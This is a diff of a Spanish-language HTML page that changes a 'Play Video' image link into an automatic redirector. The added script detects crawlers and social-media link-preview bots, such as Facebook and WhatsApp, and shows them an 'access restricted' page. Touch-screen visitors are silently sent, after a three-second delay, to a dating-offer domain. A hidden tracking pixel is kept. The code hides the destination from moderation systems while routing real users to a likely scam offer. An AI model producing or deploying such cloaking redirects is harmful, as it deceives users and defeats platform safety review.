@@ -1,52 +1,64 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-    <title>Play Video</title>
-    <style>
-        body {
-            margin: 0;
-            background-color: #000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Redirigiendo...</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: #000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
 
-        img {
-            max-width: 100%;
-            height: auto;
-            cursor: pointer;
-        }
-    </style>
+    img {
+      max-width: 100%;
+      height: auto;
+    }
+  </style>
 </head>
 <body>
 
-    <a id="imageLink" href="#">
-        <img src="https://i.ibb.co/rGxdBzf5/An-example-of-a-pre-landing-page-for-Dating-offers.jpg?text=Haz+Click+Aquí" alt="Imagen de redirección">
-    </a>
+  <!-- Imagen visible mientras se filtra tráfico -->
+  <img src="https://i.ibb.co/rGxdBzf/An-example-of-a-pre-landing-page-for-Dating-offers.jpg?text=Haz+Click+Aquí" alt="Redireccionando...">
 
-    <script>
-        // Lista de enlaces
-        const links = [
-            "https://daupmrb.vipsthelovehaven.com/um9h34e",
-            "https://daupmrb.vipsthelovehaven.com/um9h34e",
-            "https://daupmrb.vipsthelovehaven.com/um9h34e",
-            "https://daupmrb.vipsthelovehaven.com/um9h34e",
-            "https://daupmrb.vipsthelovehaven.com/um9h34e"
-        ];
+  <script>
+    // Lista de enlaces
+    const links = [
+      "https://daupmrb.vipsthelovehaven.com/um9h34e",
+      "https://daupmrb.vipsthelovehaven.com/um9h34e",
+      "https://daupmrb.vipsthelovehaven.com/um9h34e",
+      "https://daupmrb.vipsthelovehaven.com/um9h34e",
+      "https://daupmrb.vipsthelovehaven.com/um9h34e"
+    ];
 
-        // Elegir un enlace aleatorio
+    // Detectar bots comunes por User-Agent
+    const isBot = /bot|crawl|slurp|spider|mediapartners|facebook|whatsapp|preview/i.test(navigator.userAgent);
+
+    // Verificar si es pantalla táctil (evita tráfico de escritorio emulado)
+    const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+
+    // Esperar 3 segundos antes de redirigir (simula carga humana)
+    setTimeout(() => {
+      if (!isBot && hasTouch) {
         const randomLink = links[Math.floor(Math.random() * links.length)];
+        window.location.href = randomLink;
+      } else {
+        console.log("Tráfico bloqueado por sospecha de bot.");
+        // Puedes redirigir a una página de salida o quedarte aquí
+        document.body.innerHTML = "<h1 style='color: white; text-align:center;'>Acceso restringido</h1>";
+      }
+    }, 3000);
+  </script>
 
-        // Asignar al <a> el enlace aleatorio
-        document.getElementById("imageLink").href = randomLink;
-    </script>
-</script>
+  <!-- Pixel invisible -->
   <div style="visibility:hidden">
-    <center><img src="//whos.amung.us/pingjs/?k=lonelywolf&amp;t=TeamCastle&amp;x=https://www.youtube.com/" style="display:none">
+    <center>
+      <img src="//whos.amung.us/pingjs/?k=lonelywolf&amp;t=TeamCastle&amp;x=https://www.youtube.com/" style="display:none">
     </center>
-</div>
+  </div>
 </body>
 </html>
